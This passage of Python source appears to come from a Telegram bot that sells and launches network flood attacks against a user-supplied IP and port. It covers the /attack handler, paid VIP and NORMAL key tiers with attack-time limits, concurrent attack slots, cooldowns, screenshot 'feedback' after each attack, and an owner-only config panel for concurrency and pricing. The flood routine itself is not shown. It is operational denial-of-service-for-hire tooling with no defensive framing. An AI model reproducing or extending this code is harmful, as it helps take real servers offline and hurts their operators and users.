        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑴𝒊𝒏𝒊𝒎𝒖𝒎 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆 𝒊𝒔 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", reply_to=message)
            return
        
        if not is_group:
            user = users_collection.find_one({'user_id': user_id})
            key_type = user.get('key_type', 'NORMAL') if user else 'NORMAL'
            max_time = user.get('max_attack_time', get_key_max_attack(key_type)) if user else get_max_attack_time()
        else:
            max_time = get_group_max_attack_time(group_id)
        
        if not is_owner(user_id) and duration > max_time:
            if not is_group:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖𝒓 {key_type} 𝒌𝒆𝒚 𝒂𝒍𝒍𝒐𝒘𝒔 𝒎𝒂𝒙 {max_time}s 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆!</b>", reply_to=message)
            else:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒕𝒊𝒎𝒆 𝒇𝒐𝒓 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑: {max_time}s</b>", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        slot_index = get_free_slot()
        
        if slot_index is None:
            busy_slots, free_slots, total_slots = get_slot_status()
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒂𝒕𝒕𝒂𝒄𝒌 𝒍𝒊𝒎𝒊𝒕 𝒓𝒆𝒂𝒄𝒉𝒆𝒅!</b> 𝑨𝒍𝒍 {total_slots} 𝒔𝒍𝒐𝒕𝒔 𝒂𝒓𝒆 𝒃𝒖𝒔𝒚.\n\n𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.", reply_to=message)
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = slot_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group,
                'group_id': group_id
            }
            active_port_attacks[attack_id] = f"{target}:{port}"
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, slot_index, is_group, group_id))
        thread.daemon = True
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑷𝒐𝒓𝒕 𝒂𝒏𝒅 𝒕𝒊𝒎𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒏𝒖𝒎𝒃𝒆𝒓𝒔!</b>", reply_to=message)

def start_attack(target, port, duration, message, attack_id, api_index, is_group=False, group_id=None):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        if is_group:
            cooldown = get_group_cooldown_time(group_id) if group_id else get_user_cooldown_setting()
        else:
            cooldown = get_user_cooldown_setting()
        
        attack_msg = build_attack_start_message(target, port, duration, cooldown)
        safe_send_message(message.chat.id, attack_msg, reply_to=message)
        
        concurrent_val = get_concurrent_limit()
        
        send_real_attack(target, port, duration, concurrent_val)
        
        def finish_attack():
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
            
            if is_group and group_id:
                set_group_cooldown(group_id, get_group_cooldown_time(group_id))
            else:
                set_user_cooldown(user_id, get_user_cooldown_setting())
            
            complete_msg = build_attack_complete_message(target, port, duration)
            safe_send_message(message.chat.id, complete_msg, reply_to=message)
            
            if is_group:
                feedback_required = get_group_feedback_required(group_id) if group_id else get_setting('feedback_required', True)
            else:
                feedback_required = get_setting('feedback_required', True)
            
            if feedback_required:
                set_pending_feedback(user_id, target, port, duration, is_group, group_id)
            else:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝒀𝒐𝒖 𝒄𝒂𝒏 𝒏𝒐𝒘 𝒔𝒕𝒂𝒓𝒕 𝒂 𝒏𝒆𝒘 𝒂𝒕𝒕𝒂𝒄𝒌 𝒖𝒔𝒊𝒏𝒈 /attack 𝒄𝒐𝒎𝒎𝒂𝒏𝒅.</b>", reply_to=message)
        
        timer = threading.Timer(duration, finish_attack)
        timer.daemon = True
        timer.start()
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        print(f"Attack error: {e}")
        
# ============ CONFIGURATION COMMAND ============

@bot.message_handler(commands=["config"])
def config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆", callback_data="config_maxtime"),
        InlineKeyboardButton("⏳ 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏", callback_data="config_cooldown"),
        InlineKeyboardButton("🎯 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔", callback_data="config_slots"),
        InlineKeyboardButton("⚡ 𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕/𝑨𝒕𝒕𝒂𝒄𝒌", callback_data="config_concurrent"),
        InlineKeyboardButton("🚫 𝑩𝒍𝒐𝒄𝒌 𝑰𝑷", callback_data="config_blockip"),
        InlineKeyboardButton("✅ 𝑼𝒏𝒃𝒍𝒐𝒄𝒌 𝑰𝑷", callback_data="config_unblockip"),
        InlineKeyboardButton("📋 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔", callback_data="config_listip"),
        InlineKeyboardButton("🔒 𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏", callback_data="config_portprotect"),
        InlineKeyboardButton("📸 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅", callback_data="config_feedback"),
        InlineKeyboardButton("💰 𝑽𝑰𝑷 𝑷𝒓𝒊𝒄𝒊𝒏𝒈", callback_data="config_vip_price"),
        InlineKeyboardButton("💰 𝑵𝑶𝑹𝑴𝑨𝑳 𝑷𝒓𝒊𝒄𝒊𝒏𝒈", callback_data="config_normal_price"),
        InlineKeyboardButton("👥 𝑮𝒓𝒐𝒖𝒑 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_group"),
        InlineKeyboardButton("🤖 𝑩𝒐𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_bot"),
        InlineKeyboardButton("🔧 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆", callback_data="config_maintenance"),
        InlineKeyboardButton("📊 𝑪𝒖𝒓𝒓𝒆𝒏𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_view")
    )
    
    bot.reply_to(message, f"{HTML_EMOJI.SETTINGS} <b>𝑪𝑶𝑵𝑭𝑰𝑮𝑼𝑹𝑨𝑻𝑰𝑶𝑵 𝑷𝑨𝑵𝑬𝑳</b>\n\n𝑺𝒆𝒍𝒆𝒄𝒕 𝒂𝒏 𝒐𝒑𝒕𝒊𝒐𝒏 𝒕𝒐 𝒄𝒐𝒏𝒇𝒊𝒈𝒖𝒓𝒆:", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("config_"))
def config_callback(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CROSS} 𝑶𝒏𝒍𝒚 𝒐𝒘𝒏𝒆𝒓 𝒄𝒂𝒏 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔!")
        return
    
    data = call.data
    
    if data == "config_maxtime":
        bot.edit_message_text(
            f"{HTML_EMOJI.SETTINGS} <b>𝑺𝒆𝒕 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝒎𝒂𝒙𝒊𝒎𝒖𝒎 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆 𝒊𝒏 𝒔𝒆𝒄𝒐𝒏𝒅𝒔.\n" +
            f"𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {get_max_attack_time()} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>300</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_max_time_config)
        
    elif data == "config_cooldown":
        bot.edit_message_text(
            f"{HTML_EMOJI.TIMER} <b>𝑺𝒆𝒕 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝑻𝒊𝒎𝒆</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝒄𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒕𝒊𝒎𝒆 𝒊𝒏 𝒔𝒆𝒄𝒐𝒏𝒅𝒔.\n" +
            f"𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {get_user_cooldown_setting()} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>180</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_cooldown_config)
        
    elif data == "config_slots":
        bot.edit_message_text(
            f"{HTML_EMOJI.TARGET} <b>𝑺𝒆𝒕 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔 (𝑺𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔 𝑨𝒕𝒕𝒂𝒄𝒌𝒔)</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒂𝒍𝒍𝒐𝒘𝒆𝒅.\n" +
            f"𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {current_max_slots}\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>4</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_slots_config)
        
    elif data == "config_concurrent":
        bot.edit_message_text(
            f"{HTML_EMOJI.FIRE} <b>𝑺𝒆𝒕 𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝑷𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒗𝒂𝒍𝒖𝒆 𝒇𝒐𝒓 𝒆𝒂𝒄𝒉 𝑨𝑷𝑰 𝒄𝒂𝒍𝒍.\n" +
            f"𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {get_concurrent_limit()}\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>4</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_concurrent_config)
        
    elif data == "config_blockip":
        bot.edit_message_text(
            f"{HTML_EMOJI.BAN} <b>𝑩𝒍𝒐𝒄𝒌 𝑰𝑷</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 𝒕𝒐 𝒃𝒍𝒐𝒄𝒌.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>20.204</code> (𝒃𝒍𝒐𝒄𝒌𝒔 𝒂𝒍𝒍 𝑰𝑷𝒔 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 20.204)\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, block_ip_config)
        
    elif data == "config_unblockip":
        bot.edit_message_text(
            f"{HTML_EMOJI.CHECKMARK} <b>𝑼𝒏𝒃𝒍𝒐𝒄𝒌 𝑰𝑷</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 𝒕𝒐 𝒖𝒏𝒃𝒍𝒐𝒄𝒌.\n\n𝑼𝒔𝒆 /blockedips 𝒕𝒐 𝒔𝒆𝒆 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝒑𝒓𝒆𝒇𝒊𝒙𝒆𝒔.\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, unblock_ip_config)
        
    elif data == "config_listip":
        blocked = get_all_blocked_ips()
        if not blocked:
            response = f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝑰𝑷𝒔 𝒂𝒓𝒆 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!"
        else:
            response = f"{HTML_EMOJI.BAN} <b>𝑩𝑳𝑶𝑪𝑲𝑬𝑫 𝑰𝑷𝒔</b>\n\n"
            for i, ip_data in enumerate(blocked, 1):
                response += f"{i}. <code>{ip_data['ip']}*</code>\n"
            response += f"\n{HTML_EMOJI.STATS} 𝑻𝒐𝒕𝒂𝒍: {len(blocked)}"
        
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif data == "config_portprotect":
        current = get_setting('port_protection', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ 𝑬𝒏𝒂𝒃𝒍𝒆" if not current else "🔴 𝑨𝒍𝒓𝒆𝒂𝒅𝒚 𝑶𝑵", callback_data="portprotect_on"),
            InlineKeyboardButton("❌ 𝑫𝒊𝒔𝒂𝒃𝒍𝒆" if current else "⚪ 𝑨𝒍𝒓𝒆𝒂𝒅𝒚 𝑶𝑭𝑭", callback_data="portprotect_off"),
            InlineKeyboardButton("🔙 𝑩𝒂𝒄𝒌", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{HTML_EMOJI.LOCK} <b>𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏</b>\n\n𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {'🟢 𝑬𝑵𝑨𝑩𝑳𝑬𝑫' if current else '🔴 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫'}\n\n𝑾𝒉𝒆𝒏 𝒆𝒏𝒂𝒃𝒍𝒆𝒅, 𝒔𝒂𝒎𝒆 𝒑𝒐𝒓𝒕 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒂𝒕𝒕𝒂𝒄𝒌𝒆𝒅 𝒕𝒘𝒊𝒄𝒆 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔𝒍𝒚.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    elif data == "config_feedback":
        current = get_setting('feedback_required', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ 𝑬𝒏𝒂𝒃𝒍𝒆" if not current else "🔴 𝑨𝒍𝒓𝒆𝒂𝒅𝒚 𝑶𝑵", callback_data="feedback_on"),
            InlineKeyboardButton("❌ 𝑫𝒊𝒔𝒂𝒃𝒍𝒆" if current else "⚪ 𝑨𝒍𝒓𝒆𝒂𝒅𝒚 𝑶𝑭𝑭", callback_data="feedback_off"),
            InlineKeyboardButton("🔙 𝑩𝒂𝒄𝒌", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{HTML_EMOJI.CAMERA} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅</b>\n\n𝑪𝒖𝒓𝒓𝒆𝒏𝒕: {'🟢 𝑹𝑬𝑸𝑼𝑰𝑹𝑬𝑫' if current else '🔴 𝑵𝑶𝑻 𝑹𝑬𝑸𝑼𝑰𝑹𝑬𝑫'}\n\n𝑾𝒉𝒆𝒏 𝒆𝒏𝒂𝒃𝒍𝒆𝒅, 𝒖𝒔𝒆𝒓𝒔 𝒎𝒖𝒔𝒕 𝒔𝒆𝒏𝒅 𝒂 𝒔𝒄𝒓𝒆𝒆𝒏𝒔𝒉𝒐𝒕 𝒂𝒇𝒕𝒆𝒓 𝒆𝒂𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    elif data == "config_view":
        busy_slots, free_slots, total_slots = get_slot_status()
        response = f"{HTML_EMOJI.STATS} <b>𝑪𝑼𝑹𝑹𝑬𝑵𝑻 𝑺𝑬𝑻𝑻𝑰𝑵𝑮𝑺</b>\n\n"
        response += f"{HTML_EMOJI.SETTINGS} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆: {get_max_attack_time()}s\n"
        response += f"{HTML_EMOJI.TIMER} 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏: {get_user_cooldown_setting()}s\n"
        response += f"{HTML_EMOJI.TARGET} 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {total_slots} (𝑭𝒓𝒆𝒆: {free_slots})\n"
        response += f"{HTML_EMOJI.FIRE} 𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝑷𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌: {get_concurrent_limit()}\n"
        response += f"{HTML_EMOJI.LOCK} 𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏: {'𝑶𝑵' if get_setting('port_protection', True) else '𝑶𝑭𝑭'}\n"
        response += f"{HTML_EMOJI.CAMERA} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: {'𝑶𝑵' if get_setting('feedback_required', True) else '𝑶𝑭𝑭'}\n"
        response += f"{HTML_EMOJI.SETTINGS} 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆: {'𝑶𝑵' if is_maintenance() else '𝑶𝑭𝑭'}\n"
        response += f"{HTML_EMOJI.BAN} 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔: {len(get_all_blocked_ips())}\n"
        response += f"{HTML_EMOJI.USERS} 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑮𝒓𝒐𝒖𝒑𝒔: {approved_groups_collection.count_documents({})}\n"
        response += f"{HTML_EMOJI.DISCORD} 𝑨𝒄𝒕𝒊𝒗𝒆 𝑩𝒐𝒕𝒔: {len([b for b in get_all_bots() if b.get('active')])}\n"
        response += f"\n{HTML_EMOJI.STAR} 𝑽𝑰𝑷 𝑴𝑨𝑿 𝑨𝑻𝑻𝑨𝑪𝑲: {get_key_max_attack('VIP')}s\n"
        response += f"{HTML_EMOJI.DOCUMENT} 𝑵𝑶𝑹𝑴𝑨𝑳 𝑴𝑨𝑿 𝑨𝑻𝑻𝑨𝑪𝑲: {get_key_max_attack('NORMAL')}s\n"
        
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif data == "config_back":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⚙️ 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆", callback_data="config_maxtime"),
            InlineKeyboardButton("⏳ 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏", callback_data="config_cooldown"),
            InlineKeyboardButton("🎯 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔", callback_data="config_slots"),
            InlineKeyboardButton("⚡ 𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕/𝑨𝒕𝒕𝒂𝒄𝒌", callback_data="config_concurrent"),
            InlineKeyboardButton("🚫 𝑩𝒍𝒐𝒄𝒌 𝑰𝑷", callback_data="config_blockip"),
            InlineKeyboardButton("✅ 𝑼𝒏𝒃𝒍𝒐𝒄𝒌 𝑰𝑷", callback_data="config_unblockip"),
            InlineKeyboardButton("📋 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔", callback_data="config_listip"),
            InlineKeyboardButton("🔒 𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏", callback_data="config_portprotect"),
            InlineKeyboardButton("📸 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅", callback_data="config_feedback"),
            InlineKeyboardButton("💰 𝑽𝑰𝑷 𝑷𝒓𝒊𝒄𝒊𝒏𝒈", callback_data="config_vip_price"),
            InlineKeyboardButton("💰 𝑵𝑶𝑹𝑴𝑨𝑳 𝑷𝒓𝒊𝒄𝒊𝒏𝒈", callback_data="config_normal_price"),
            InlineKeyboardButton("👥 𝑮𝒓𝒐𝒖𝒑 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_group"),
            InlineKeyboardButton("🤖 𝑩𝒐𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_bot"),
            InlineKeyboardButton("🔧 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆", callback_data="config_maintenance"),
            InlineKeyboardButton("📊 𝑪𝒖𝒓𝒓𝒆𝒏𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data="config_view")
        )
        bot.edit_message_text(
            f"{HTML_EMOJI.SETTINGS} <b>𝑪𝑶𝑵𝑭𝑰𝑮𝑼𝑹𝑨𝑻𝑰𝑶𝑵 𝑷𝑨𝑵𝑬𝑳</b>\n\n𝑺𝒆𝒍𝒆𝒄𝒕 𝒂𝒏 𝒐𝒑𝒕𝒊𝒐𝒏 𝒕𝒐 𝒄𝒐𝒏𝒇𝒊𝒈𝒖𝒓𝒆:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )

@bot.callback_query_handler(func=lambda call: call.data in ["portprotect_on", "portprotect_off", "feedback_on", "feedback_off", "maint_on", "maint_off", "group_add", "group_remove", "group_list", "bot_add", "bot_remove", "bot_list"])
def action_callbacks(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CROSS} 𝑶𝒏𝒍𝒚 𝒐𝒘𝒏𝒆𝒓 𝒄𝒂𝒏 𝒅𝒐 𝒕𝒉𝒊𝒔!")
        return
    
    if call.data == "portprotect_on":
        set_setting('port_protection', True)
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CHECKMARK} 𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "portprotect_off":
        set_setting('port_protection', False)
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CHECKMARK} 𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝑷𝒐𝒓𝒕 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "feedback_on":
        set_setting('feedback_required', True)
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CHECKMARK} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "feedback_off":
        set_setting('feedback_required', False)
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CHECKMARK} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "maint_on":
        set_maintenance(True, "Bot is under maintenance. Please try again later.")
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.SETTINGS} 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.SETTINGS} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "maint_off":
        set_maintenance(False)
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CHECKMARK} 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!")
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "group_add":
        bot.edit_message_text(
            f"{HTML_EMOJI.ARROW_RIGHT} <b>𝑨𝒅𝒅 𝑮𝒓𝒐𝒖𝒑</b>\n\n𝑺𝒆𝒏𝒅: <code>/addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt;</code>\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>/addgrp TESTGROUP -100123456789 30</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        
    elif call.data == "group_remove":
        bot.edit_message_text(
